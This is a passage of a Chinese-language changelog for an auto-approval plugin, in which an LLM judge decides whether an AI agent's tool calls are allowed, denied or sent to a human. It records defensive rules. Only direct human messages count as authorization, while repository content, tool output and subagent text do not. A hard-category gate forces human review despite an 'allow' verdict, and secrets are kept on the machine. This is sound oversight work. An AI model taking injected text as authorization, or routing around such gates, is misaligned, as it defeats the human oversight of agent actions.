- **授权来源限定**：判定模型只承认**直接人类消息**为授权（最多 4 条、逐条脱敏、总预算 4000 字符）；仓库内容、工具输出、assistant 文本、skill / 插件 / 子代理文本一律不构成授权

### 变更

- **判定模型输出协议变更**：`SAFE` / `RISKY:<类别>` 不再被接受。若你为本插件单独配置了判定提示或下游工具，需要同步更新
- **安全闸**：判定模型给出 `decision: "allow"` 但 `category` 命中 `hardCategories` 时，**强制转人工**，不允许绕过硬类别闸门
- **失败兜底语义变更**：原先「判定失败即转人工」改为「连续失败计数」——前 2 次为静默拒绝，第 3 次才转人工
- 新增事件 `kind`：`hard-reject`（硬拒档）与 `judge-deny`（判定 `deny` / 连续失败静默拒绝）；人工审查视图对二者显示红色「已直接拒绝」并标注原因
- 挂载日志改为反映新管道顺序

### 新增配置

- `judgeFailureLimit`：判定器连续失败多少次后转一次人工（默认 3，**机器本地**配置，不参与多机同步）

### 测试

- 新增 `test/absorbed.test.mjs`：5 项移植能力的回归测试，断言针对 `src/` 下的**真实导出实现**（不在测试内重复逻辑），覆盖脱敏边界、JSON 协议非法输入 fail-safe、硬拒分档、提示层契约、失败计数、授权来源
- 新增 `test/pipeline.test.mjs`：**模拟宿主**真实执行注册的 `approval/request` 处理器，覆盖硬拒不弹窗、硬事实转人工、白名单零模型调用、`allow`/`deny`/`ask` 分流、`allow` + 硬类别安全闸、连续失败计数与清零、**密钥不出站**、预设门控
- `npm test` 已纳入 3 个新模块的语法检查与上述两个测试文件

### 文档

- README（中/英）与 docs/GUIDE（中/英）补充新管道顺序、JSON 裁决协议、脱敏行为与边界、失败计数、硬拒两档、提示层指导与 `judgeFailureLimit`
- 补充**上游署名**：上述 5 项能力移植自 NanmiCoder/dsh-auto-mode（MIT License），原始设计与实现版权归该项目所有

## [0.5.5] — 2026-09-16

### 新增

- **多机规则共享**：插件包内（仓库根目录）的 `allowlist.json` 作为汇总版规则，加载时增量并入本地配置（只增不减、按特征去重、幂等、版本以仓库为准）
- 仓库根目录打包 `allowlist.json` 作为共享规则种子

### 修复

- 判定模型配置字段 `model` → `judgeModel` 迁移：保留本机原有取值，移除旧键；已显式配置 `judgeModel` 时以它为准（此前旧配置里的 `model` 不再被读取，导致判定模型静默失效）
- `/api/auto-approve/*` 路由补上 DSH 核心凭据围栏（上游 issue #12）：`connection.requestRejection` 优先，缺失时退化为来源校验；`requestAuthRejection` 内层加异常保护
- 清理机器本地标识符与失效文档

### 变更

- 仓库元数据指向本 fork，安装改为从本仓库安装

## [0.5.0] — 2026-08-18

### 新增

- **文件改动对比与撤销**：审批涉及的文件可点击查看 unified diff——变动行带上下 5 行上下文、多处修改按 hunk 分区并以「N unmodified lines」分隔条折叠、双行号；一键「撤销此改动」投递指令让 AI 按快照恢复文件
- **会话级快照管理**：快照按事件归属会话，审批视图按当前会话统计；清理支持「仅清本会话」与「清空全部」两档
- diff / 撤销 / 快照管理 API

### 修复

- **diff 快照数据源断档**：`callId` 回溯工具参数取真实路径（B 层）+ `justification` 兜底（C 层），`manual-pending` 也保存快照
- **bash 只读命令产生假快照**：写特征精确化 + 设备/空内容过滤 + UI 文件级可点击
- 自动学习缺陷修复、判定模型解耦、上游 issue 批量修复

## [0.4.1] — 2026-08-17

### 新增

- 设置页「自动审批」分区：可视化规则管理（管道总览 / 危险词黑名单 / 白名单 / 永久人工 / 阈值与超时 / 正在学习）
- 一键初始化权限预设（文本级写入 `cordis.patch.yml`，保留注释格式）
- 规则管理 API：`GET/POST /api/auto-approve/rules`、`POST /api/auto-approve/setup`

### 修复

- 提示条历史弹窗问题

## [0.4.0] — 2026-08-16

### 新增

- **人工审查 UI**：自动放行时输入框上方绿色提示条；「审批」历史视图（轨迹右侧）
- 审批历史视图时间倒序（最新在上）

### 修复

- `client.js` 补齐标准导出模式（`default` / `apply` / `inject`），与 DSH bundle 规范一致

## [0.3.0] — 2026-08-16

### 新增

- **flash 第三方同类验证**：语义级判断新操作是否与用户确认样本同类（`SAME` / `DIFFERENT`）
- **中立类别人工确认制**：同一「工具+模式+类别」被人工确认 N 次后，第 N+1 次起自动放行
- 沉淀/拒绝规则携带**操作指纹**（`contains`），修复宽规则误放行漏洞
- `allowlist.json` 配置热更新（每次审批前重新读盘，改配置无需重启）

### 修复

- 白盒走查修复 3 个 P0 + 3 个 P1（可达性 / 有效性）

## 更早版本

0.3.0 之前为本 fork 的初始开发阶段与上游 [moon09300731/dsh-approval-gate](https://github.com/moon09300731/dsh-approval-gate) 的基础实现，未逐条记录。
